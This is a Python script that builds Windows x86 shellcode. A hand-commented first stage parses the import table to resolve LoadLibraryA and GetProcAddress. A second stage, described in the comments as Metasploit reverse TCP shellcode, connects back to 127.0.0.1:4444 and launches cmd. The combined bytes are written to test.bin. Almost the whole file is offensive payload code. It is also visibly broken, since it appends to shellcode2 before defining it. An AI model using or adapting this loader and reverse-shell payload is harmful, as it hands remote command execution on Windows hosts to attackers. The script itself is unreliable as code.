#!/usr/bin/env python3
import sys
import struct
# -*- coding: ISO-8859-1 -*-
PY2 = sys.version_info.major == 2

shellcode1 = "\xfc"  # cld

shellcode1 += ("\x60"  # pushad
"\x8B\xEC"  # mov ebp, esp
)

# TO DO: IAT Parser API
shellcode1 += ( "\xfc"
                   "\x31\xd2"                      # xor edx, edx                          ;prep edx for use
                   "\x64\x8b\x52\x30"              # mov edx, dword ptr fs:[edx + 0x30]    ;PEB
                   "\x8b\x52\x08"                  # mov edx, dword ptr [edx + 8]          ;PEB.imagebase
                   "\x8b\xda"                      # mov ebx, edx                          ;Set ebx to imagebase
                   #"\x8b\xc3"                      # mov eax, ebx                         ;Set eax to imagebase
                   "\x03\x52\x3c"                  # add edx, dword ptr [edx + 0x3c]       ;"PE"
                   "\x8b\xba\x80\x00\x00\x00"      # mov edi, dword ptr [edx + 0x80]       ;Import Table RVA
                   "\x03\xfb"                      # add edi, ebx                          ;Import table in memory offset

                   #findImport:
                   "\x8b\x57\x0c"                  # mov edx, dword ptr [edi + 0xc]        ;Offset for Import Directory Table Name RVA
                   "\x03\xd3"                      # add edx, ebx                          ;Offset in memory
                   "\x81\x3a\x4b\x45\x52\x4e"      # cmp dword ptr [edx], 0x4e52454b       ;Replace this so any API can be called
                   "\x74\x05"                      # je 0x102f                             ;jmp saveBase
                   "\x83\xc7\x14"                  # add edi, 0x14                         ;inc to next import
                   "\xeb\xee"                      # jmp 0x101d                            ;Jmp findImport

                   #saveBase:
                   "\x57"                          # push edi                              ;save addr of import base
                   "\xeb\x3e"                      # jmp 0x106e                            ;jmp loadAPIs

                   #setBounds:
                   #;this is needed as the parsing could lead to eax ptr's to unreadable addresses
                   "\x8b\x57\x10"                  # mov edx, dword ptr [edi + 0x10]       ;Point to API name
                   "\x03\xd3"                      # add edx, ebx                          ;Adjust to in memory offset
                   "\x8b\x37"                      # mov esi, dword ptr [edi]              ;Set ESI to the Named Import base
                   "\x03\xf3"                      # add esi, ebx                          ;Adjust to in memory offset
                   "\x8b\xca"                      # mov ecx, edx                          ;Mov in memory offset to ecx
                   "\x81\xc1\x00\x00\xff\x00"      # add ecx, 0x40000                      ;Set an upper bounds for reading
                   "\x33\xed"                      # xor ebp, ebp                          ;Zero ebp for thunk offset

                   #findAPI:
                   "\x8b\x06"                      # mov eax, dword ptr [esi]              ;Mov pointer to Named Imports
                   "\x03\xc3"                      # add eax, ebx                          ;Find in memory offset
                   "\x83\xc0\x02"                  # add eax, 2                            ;Adjust to ASCII name start
                   "\x3b\xc8"                      # cmp ecx, eax                          ;Check if over bounds
                   "\x72\x18"                      # jb 0x1066                             ;If not over, don't jump to increment
                   "\x3b\xc2"                      # cmp eax, edx                          ;Check if under Named import
                   "\x72\x14"                      # jb 0x1066                             ;If not over, don't jump to increment
                   "\x3e\x8b\x7c\x24\x04"          # mov edi, dword ptr ds:[esp + 4]       ;Move API name to edi
                   "\x39\x38"                      # cmp dword ptr [eax], edi              ;Check first 4 chars
                   "\x75\x0b"                      # jne 0x1066                            ;If not a match, jump to increment
                   "\x3e\x8b\x7c\x24\x08"          # mov edi, dword ptr ds:[esp + 8]       ;Move API 2nd named part to edi
                   "\x39\x78\x08"                  # cmp dword ptr [eax + 8], edi          ;Check next 4 chars
                   "\x75\x01"                      # jne 0x1066                            ;If not a match, jump to increment
                   "\xc3"                          # ret                                   ;If a match, ret

                   #Increment:
                   "\x83\xc5\x04"                  # add ebp, 4                            ;inc offset
                   "\x83\xc6\x04"                  # add esi, 4                            ;inc to next name
                   "\xeb\xd5"                      # jmp 0x1043                            ;jmp findAPI

                   #loadAPIs
                   "\x68\x61\x72\x79\x41"          # push 0x41797261                       ;aryA (notice the 4 char jump between beginning)
                   "\x68\x4c\x6f\x61\x64"          # push 0x64616f4c                       ;Load
                   "\xe8\xb3\xff\xff\xff"          # call 0x1032                           ;call setBounds
                   "\x03\xd5"                      # add edx, ebp                          ;In memory offset of API thunk
                   "\x83\xc4\x08"                  # add ESP, 8                            ;Move stack to import base addr
                   #"\x5d"                          # pop ebp                              ;remove loadlibrary from stack
                   #"\x5d"                          # pop ebp                              ;...
                   #"\x33\xed"                      # xor ebp, ebp                         ;
                   "\x5f"                          # pop edi                               ;restore import base addr for parsing
                   "\x52"                          # push edx                              ;save LoadLibraryA thunk address on stack
                   "\x68\x64\x64\x72\x65"          # push 0x65726464                       ;ddre
                   "\x68\x47\x65\x74\x50"          # push 0x50746547                       ;Getp
                   "\xe8\x9d\xff\xff\xff"          # call 0x1032                           ;call setBounds
                   "\x03\xd5"                      # add edx, ebp                          ;
                   "\x5d"                          # pop ebp                               ;
                   "\x5d"                          # pop ebp                               ;
                   "\x5b"                          # pop ebx                               ;Pop LoadlibraryA thunk addr into ebx
                   "\x8b\xca"                      # mov ecx, edx                          ;Move GetProcaddress thunk addr into ecx
                   )
                    # LOADLIBA in EBX
                    # GETPROCADDR in ECX
    
# TODO: OFFSET Table
#shellcode2 = (#"\x60"		# #pushad
#			  #"\x8b\xec"	# mov ebp, esp
#			  #"\x33\xC0"  	# xor eax, eax
			  # "\x8B\x44\x24" # MOV EAX, DWORD PTR [ESP+0x28]
#			  # "\x50" push eax 
			 # "\xff\x13"  # call dword ptr eax	

			 # 60 8B EC 8B 44 24 28 50 FF 13 8B 4C 24 14 8B 54 24 20 52







padding = "\x90" * 200
shellcode2 += padding
#=====

# Call start ADD HERE will be calculated on the fly.. 
#this calls the metasploit shellcode 

shellcode1 += "\xe8"  # Call start FIX
shellcode1 += "\xfc"  # cld

print("len shellcode2:", len(shellcode2))

if not PY2:
	shellcode1 = bytes(shellcode1, "ISO-8859-1")

shellcode1 += struct.pack("<I", len(shellcode2))

#=====
# START
#pop ebp  metasploit shellcode needs this to call the api
shellcode2 += ("\x5d\x68\x33\x32\x00\x00\x68\x77\x73\x32\x5f\x54\x68\x4c"
"\x77\x26\x07\xff\xd5\xb8\x90\x01\x00\x00\x29\xc4\x54\x50\x68"
"\x29\x80\x6b\x00\xff\xd5\x50\x50\x50\x50\x40\x50\x40\x50\x68"
"\xea\x0f\xdf\xe0\xff\xd5\x97\x6a\x05\x68\x7f\x00\x00\x01\x68"
"\x02\x00\x11\x5c\x89\xe6\x6a\x10\x56\x57\x68\x99\xa5\x74\x61"
"\xff\xd5\x85\xc0\x74\x0c\xff\x4e\x08\x75\xec\x68\xf0\xb5\xa2"
"\x56\xff\xd5\x68\x63\x6d\x64\x00\x89\xe3\x57\x57\x57\x31\xf6"
"\x6a\x12\x59\x56\xe2\xfd\x66\xc7\x44\x24\x3c\x01\x01\x8d\x44"
"\x24\x10\xc6\x00\x44\x54\x50\x56\x56\x56\x46\x56\x4e\x56\x56"
"\x53\x56\x68\x79\xcc\x3f\x86\xff\xd5\x89\xe0\x4e\x56\x46\xff"
"\x30\x68\x08\x87\x1d\x60\xff\xd5\xbb\xf0\xb5\xa2\x56\x68\xa6"
"\x95\xbd\x9d\xff\xd5\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb"
"\x47\x13\x72\x6f\x6a\x00\x53\xff\xd5")




shellcode = ''
#shellcode = shellcode1 + shellcode2


if not PY2:
	shellcode = shellcode1 + bytes(shellcode2, "ISO-8859-1")
else:
	shellcode = shellcode1 + shellcode2

open('test.bin', 'wb').write(shellcode)

print("Shellcode len:", len(shellcode))

# metasploit reverse tcp asm or whatever

